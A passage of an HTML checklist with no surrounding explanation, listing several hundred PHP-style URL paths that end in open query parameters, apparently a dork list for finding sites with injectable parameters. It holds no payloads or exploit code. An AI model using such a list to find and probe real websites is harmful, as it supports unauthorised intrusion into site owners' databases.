<li><input disabled="" type="checkbox"> <p>publications/publication.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>purelydiamond/products/category.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> </li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/books_detail.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>blog.php?blog=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prodotti.php?id_cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?CID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>poem_list.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?categoryId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>authorDetails.php?bookID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>press_release.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_list.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>colourpointeducational/more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>download.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/category.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>i-know/content.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/index.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>yacht_search/yacht_view.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pharmaxim/category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/newsitem.php?newsID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>details.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?item_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>edition.php?area_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?area_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_newsletter.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>library.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>categories.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?area_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>categories.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>publications.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?sub_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?area_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?area_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?cID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>newsitem.php?newsid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>frontend/category.php?id_category=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/newsitem.php?newsID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>things-to-do/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?area_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?area_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>listing.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?iid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>customer/home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>staff/publications.php?sn=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/newsitem.php?newsID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>library.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main/index.php?uid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>library.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop/eventshop/product_detail.php?itemid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/newsitem.php?newsID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/newsitem.php?newsID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>library.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>FullStory.php?Id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>publications.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>publications/book_reviews/full_review.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>newsitem.php?newsID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>newsItem.php?newsId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>site/en/list_service.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?area_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?ProductID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>releases_headlines_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?product=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>garden_equipment/pest-weed-control/product.php?pr=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>browsepr.php?pr=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>kshop/product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showproduct.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pageId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?tid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product-list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>onlinesales/product.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>garden_equipment/Fruit-Cage/product.php?pr=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?tid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showsub.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?fid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product-list.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?sku=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productList.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_detail.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>wiki/pmwiki.php?page****=</p>
</li>
<li><input disabled="" type="checkbox"> <p>summary.php?PID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?grpid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart/product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>db/CART/product_details.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ProductList.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_ranges_view.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cei/cedb/projdetail.php?projID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?DepartmentID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?shopprodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?news=</p>
</li>
<li><input disabled="" type="checkbox"> <p>education/content.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Interior/productlist.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?categoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>modules.php?=</p>
</li>
<li><input disabled="" type="checkbox"> <p>message/comment_threads.php?postID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>artist_art.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?option=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ov_tv.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?lang=</p>
</li>
<li><input disabled="" type="checkbox"> <p>showproduct.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?lang=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?bid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?bid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cps/rde/xchg/tm/hs.xsl/liens_detail.html?lnkId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_show.php?lid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?pagerequested=</p>
</li>
<li><input disabled="" type="checkbox"> <p>downloads.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?intProductID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productList.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?intProductID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>books.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?offs=</p>
</li>
<li><input disabled="" type="checkbox"> <p>mboard/replies.php?parent_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Computer Science.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pdf_post.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>reviews.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>art.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prod.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event_info.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item_book.php?CAT=</p>
</li>
<li><input disabled="" type="checkbox"> <p>www/index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>schule/termine.php?view=</p>
</li>
<li><input disabled="" type="checkbox"> <p>goods_detail.php?data=</p>
</li>
<li><input disabled="" type="checkbox"> <p>storemanager/contents/item.php?page_code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>customer/board.htm?mode=</p>
</li>
<li><input disabled="" type="checkbox"> <p>help/com_view.html?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>n_replyboard.php?typeboard=</p>
</li>
<li><input disabled="" type="checkbox"> <p>eng_board/view.php?T=</p>
</li>
<li><input disabled="" type="checkbox"> <p>prev_results.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bbs/view.php?no=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gnu/?doc=</p>
</li>
<li><input disabled="" type="checkbox"> <p>zb/view.php?uid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>global/product/product.php?gubun=</p>
</li>
<li><input disabled="" type="checkbox"> <p>m_view.php?ps_db=</p>
</li>
<li><input disabled="" type="checkbox"> <p>naboard/memo.php?bd=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bookmark/mybook/bookmark.php?bookPageNo=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board/board.html?table=</p>
</li>
<li><input disabled="" type="checkbox"> <p>kboard/kboard.php?board=</p>
</li>
<li><input disabled="" type="checkbox"> <p>order.asp?lotid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>english/board/view****.php?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>goboard/front/board_view.php?code=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bbs/bbsView.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>boardView.php?bbs=</p>
</li>
<li><input disabled="" type="checkbox"> <p>eng/rgboard/view.php?&amp;bbs_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product/product.php?cate=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?p=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?module=</p>
</li>
<li><input disabled="" type="checkbox"> <p>?pid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bookpage.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?pagina=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>notify/notify_form.php?topic_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>php/index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>constructies/product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>php/index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?section=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show_bug.cgi?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bookpage.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>today.php?eventid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?item=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news/news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>module/range/dutch_windmill_collection.php?rangeId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>show_bug.cgi?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_details.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?groupid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>projdetails.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?productid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?prodid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>newsitem.php?newsID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>newsitem.php?newsid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>profile.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p><strong>****</strong>s_in_area.php?area_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productlist.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>productsview.php?proid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rss.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pub/pds/pds_view.php?start=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?rub=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ogloszenia/rss.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>magazin.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>galerie.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>www/index.php?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board/read.php?tid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?id_h=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?book=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?act=</p>
</li>
<li><input disabled="" type="checkbox"> <p>reply.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>stat.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>free_board/board_view.html?page=</p>
</li>
<li><input disabled="" type="checkbox"> <p>item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?prodID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gb/comment.php?gb_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>gb/comment.php?gb_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>classifieds/showproduct.php?product=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view.php?pageNum_rscomp=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cart/addToCart.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content/pages/index.php?id_cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id</p>
</li>
<li><input disabled="" type="checkbox"> <p>display.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>display.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ponuky/item_show.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main/magpreview.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>zine/board.php?board=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?arti_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>mall/more.php?ProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content/view.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?action=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board_view.php?s_board_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>KM/BOARD/readboard.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>board_view.html?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?cont_title=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?catid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>mall/more.php?ProdID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>publications.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>irbeautina/product_detail.php?product_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index_en.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bid/topic.php?TopicID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>news_content.php?CategoryID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>front/bin/forumview.phtml?bbcode=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cat.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>stat.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>veranstaltungen/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>english/print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content/conference_register.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rss/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>main.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>rtfe.php?siteid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>classifieds/detail.php?siteid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tools/print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>channel/channel-layout.php?objId=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>resources/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content/programme.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>products/parts/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.html?isbn=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>picgallery/category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>displayArticleB.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>knowledge_base/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bpac/calendar/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>mb_showtopic.php?topic_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pages.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>exhibition_overview.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>singer/detail.php?siteid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_detail.php?X_EID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?ISBN=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>htmlpage.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>story.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>tools/print.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>php/event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>articlecategory.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>ibp.php?ISBN=</p>
</li>
<li><input disabled="" type="checkbox"> <p>club.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>aboutchiangmai/details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>book.php?isbn=</p>
</li>
<li><input disabled="" type="checkbox"> <p>blog_detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?cPath=</p>
</li>
<li><input disabled="" type="checkbox"> <p>product_info.php?products_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>shop_display_products.php?cat_id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>modules/content/index.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>printcards.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events/event.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>more_details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>default.php?TID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>general.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>referral/detail.php?siteid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>event.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>cemetery.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>index.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>content.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>exhibitions/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>bookview.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>edatabase/home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>store/view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>events/event_detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_items.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>pages/video.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>about_us.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>recipe/category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>view_item.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>en/main.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>More_Details.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>category.php?cid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>home.php?cat=</p>
</li>
<li><input disabled="" type="checkbox"> <p>article.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>page.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print-story.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>psychology/people/detail.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?sid=</p>
</li>
<li><input disabled="" type="checkbox"> <p>print.php?ID=</p>
</li>
<li><input disabled="" type="checkbox"> <p>article_preview.php?id=</p>
</li>
<li><input disabled="" type="checkbox"> <p>Pages/whichArticle.php?id=</p>
</li>
